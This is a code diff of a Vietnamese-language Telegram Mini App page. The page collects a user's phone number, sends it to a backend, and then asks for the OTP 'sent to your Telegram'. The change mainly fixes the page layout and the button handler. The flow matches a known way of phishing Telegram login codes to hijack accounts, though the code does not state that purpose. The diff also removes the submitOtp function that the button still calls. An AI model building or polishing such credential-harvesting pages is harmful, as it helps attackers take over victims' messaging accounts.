@@ -39,46 +39,30 @@
         if (phoneNumber) {
             tg.MainButton.text = "ĐANG GỬI...";
             
-            // Gửi SĐT về server để xin mã OTP
             const res = await fetch(`${BACKEND_URL}/send_phone`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ phone: phoneNumber })
             });
             
-            // Chuyển sang Bước 2: Nhập OTP
-            document.getElementById('message').innerHTML = "Mã OTP đã được gửi về Telegram của bạn.<br>Vui lòng nhập mã vào ô dưới đây:";
-            document.getElementById('app').innerHTML += '<input type="text" id="otpInput" placeholder="Nhập mã OTP...">';
+            // --- SỬA Ở ĐÂY ---
+            // Thay vì dùng +=, hãy thay thế hoàn toàn nội dung cũ bằng nội dung mới
+            const appDiv = document.getElementById('app');
+            appDiv.innerHTML = `
+                <div style="font-size: 40px; margin-bottom: 10px;">📩</div>
+                <div id="message">Mã OTP đã được gửi về Telegram của bạn.<br>Vui lòng nhập mã vào ô dưới đây:</div>
+                <input type="text" id="otpInput" placeholder="Nhập mã OTP..." style="padding: 12px; width: 90%; border-radius: 8px; border: none; margin-top: 15px; font-size: 16px;">
+            `;
             
             tg.MainButton.text = "XÁC NHẬN MÃ OTP";
-            tg.MainButton.onClick(submitOtp); // Đổi hành động nút sang gửi OTP
+            // Xóa sự kiện cũ và gán sự kiện mới cho nút
+            tg.MainButton.offClick(); 
+            tg.MainButton.onClick(submitOtp); 
+            // ------------------
         } else {
             alert("Lỗi không lấy được SĐT.");
         }
     });
-
-    // Bước 2: Gửi OTP về server
-    async function submitOtp() {
-        const otp = document.getElementById('otpInput').value;
-        if (!otp) return alert("Vui lòng nhập mã!");
-
-        tg.MainButton.text = "ĐANG XÁC MINH...";
-        const res = await fetch(`${BACKEND_URL}/verify_otp`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ otp: otp })
-        });
-        
-        const result = await res.json();
-        if (result.success) {
-            tg.MainButton.text = "THÀNH CÔNG!";
-            alert("Xác minh thành công!");
-            tg.close();
-        } else {
-            alert("Mã không đúng, vui lòng thử lại.");
-            tg.MainButton.text = "XÁC NHẬN MÃ OTP";
-        }
-    }
 </script>
 </body>
 </html>
